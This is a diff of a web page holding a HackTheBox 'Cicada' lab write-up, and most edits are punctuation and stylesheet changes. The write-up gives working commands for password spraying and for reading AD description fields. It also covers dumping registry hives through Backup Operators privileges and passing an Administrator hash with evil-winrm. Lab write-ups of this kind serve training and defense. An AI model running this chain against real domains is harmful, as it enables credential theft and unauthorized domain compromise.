@@ -52,7 +52,7 @@
     
 
     <link rel="canonical" href="http://localhost:1313/writeups/htb-cicada/">
-    <link href="/style.min.70057854b479eccebd00ce1d33560341c1c0af8cca6befd58da0b5471046514b.css" rel="stylesheet">
+    <link href="/style.min.2dc4fd9484cccdeb4e540eaff87cc3f2c37bacb70d134bbaec04ff76525358fc.css" rel="stylesheet">
     <link href="/code-highlight.min.706d31975fec544a864cb7f0d847a73ea55ca1df91bf495fd12a177138d807cf.css" rel="stylesheet">
 
     
@@ -197,7 +197,7 @@ stroke-linejoin="round" class="feather feather-home">
     <div class="mini-toc-content" id="miniTocContent"></div>
 </div>
             <div class="page-content">
-                <p>Windows box, no web server. Everything comes from SMB and LDAP, one credential leading to the next. It&rsquo;s a nice example of how a single operational security mistake - a default password in an HR notice, a cleartext password in an AD description, credentials embedded in a script - cascades into domain compromise. The escalation at the end via Backup Operators and SeBackupPrivilege is a classic that deserves proper understanding.</p>
+                <p>Windows box, no web server. Everything comes from SMB and LDAP, one credential leading to the next. It&rsquo;s a nice example of how a single operational security mistake, a default password in an HR notice, a cleartext password in an AD description, credentials embedded in a script, cascades into domain compromise. The escalation at the end via Backup Operators and SeBackupPrivilege is a classic that deserves proper understanding.</p>
 <h2 id="recon">Recon</h2>
 <p>10.129.231.149, domain <code>cicada.htb</code>, DC hostname <code>CICADA-DC</code>. Windows Server 2022. Standard AD ports, WinRM on 5985, no MSSQL this time. Anonymous SMB auth was denied, but the guest account worked:</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nxc smb 10.129.231.149 -u <span class="s1">&#39;guest&#39;</span> -p <span class="s1">&#39;&#39;</span> --shares
@@ -232,7 +232,7 @@ To change your password: ...
 </span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> michael.wrightson:Cicada<span class="nv">$M6Corpb</span>*@Lp#nZp!8
 </span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> david.orelious: STATUS_LOGON_FAILURE
 </span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> emily.oscars: STATUS_LOGON_FAILURE
-</span></span></code></pre></div><p><code>michael.wrightson</code> hadn&rsquo;t changed his default password. WinRM denied him, but LDAP worked - enough to query the directory.</p>
+</span></span></code></pre></div><p><code>michael.wrightson</code> hadn&rsquo;t changed his default password. WinRM denied him, but LDAP worked, enough to query the directory.</p>
 <h2 id="davidorelious-from-an-ad-description-field">david.orelious from an AD Description Field</h2>
 <p>With authenticated LDAP access, I ran nxc&rsquo;s <code>get-desc-users</code> module. It queries the <code>description</code> attribute on all user objects in AD. Admins sometimes stash passwords there when they create accounts:</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nxc ldap 10.129.231.149 -u michael.wrightson -p <span class="s1">&#39;Cicada$M6Corpb*@Lp#nZp!8&#39;</span> -M get-desc-users
@@ -254,10 +254,10 @@ To change your password: ...
 </span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> cicada.htb<span class="se">\e</span>mily.oscars:Q!3@Lp#M6b*7t*Vt <span class="o">(</span>Pwn3d!<span class="o">)</span>
 </span></span></code></pre></div><p>User flag on her desktop.</p>
 <h2 id="backup-operators-and-sebackupprivilege">Backup Operators and SeBackupPrivilege</h2>
-<p>I noticed emily&rsquo;s group memberships in BloodHound before I had her password - she was in the Backup Operators group alongside Remote Management Users:</p>
+<p>I noticed emily&rsquo;s group memberships in BloodHound before I had her password. She was in the Backup Operators group alongside Remote Management Users:</p>
 <p><img src="/images/writeups/htb-cicada/bloodhound-emily-backup-operators.png" alt="BloodHound graph showing EMILY.OSCARS@CICADA.HTB is MemberOf Backup Operators, Remote Management Users, and Domain Users groups"></p>
 <p><code>whoami /all</code> inside her WinRM session confirmed it: <code>SeBackupPrivilege</code> and <code>SeRestorePrivilege</code>, both enabled.</p>
-<p>Backup Operators is a privileged built-in group designed to let members back up and restore files regardless of their normal permissions. The underlying mechanism is SeBackupPrivilege, which bypasses normal ACL checks when opening files for backup purposes. On a domain controller, that includes the registry hives - specifically <code>HKLM\SAM</code> and <code>HKLM\SYSTEM</code>, which together allow offline extraction of all local account NT hashes.</p>
+<p>Backup Operators is a privileged built-in group designed to let members back up and restore files regardless of their normal permissions. The underlying mechanism is SeBackupPrivilege, which bypasses normal ACL checks when opening files for backup purposes. On a domain controller, that includes the registry hives, specifically <code>HKLM\SAM</code> and <code>HKLM\SYSTEM</code>, which together allow offline extraction of all local account NT hashes.</p>
 <p>The nxc <code>backup_operator</code> module automates the whole thing remotely. It starts RemoteRegistry via a named pipe, then uses backup semantics to save the hives directly to a readable share:</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nxc smb 10.129.231.149 -u emily.oscars -p <span class="s1">&#39;Q!3@Lp#M6b*7t*Vt&#39;</span> -M backup_operator
 </span></span><span class="line"><span class="cl">
@@ -272,7 +272,7 @@ To change your password: ...
 </span></span><span class="line"><span class="cl">Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b87e7c93a3e8a0ea4a581937016f341:::
 </span></span></code></pre></div><p>Pass-the-hash:</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">evil-winrm -i 10.129.231.149 -u Administrator -H 2b87e7c93a3e8a0ea4a581937016f341
-</span></span></code></pre></div><p>Root flag. The password in the account description field is the thing to remember from this one. Not a misconfigured service, not a protocol weakness - just someone typing a credential into a field meant for a note and forgetting about it. Check description fields in BloodHound data, every time.</p>
+</span></span></code></pre></div><p>Root flag. The password in the account description field is the thing to remember from this one. Not a misconfigured service, not a protocol weakness. Just someone typing a credential into a field meant for a note and forgetting about it. Check description fields in BloodHound data, every time.</p>
 
             </div>
         </article></main>
@@ -397,6 +397,11 @@ To change your password: ...
 </svg>
 
 </a>
+
+
+    
+
+
 
 
     
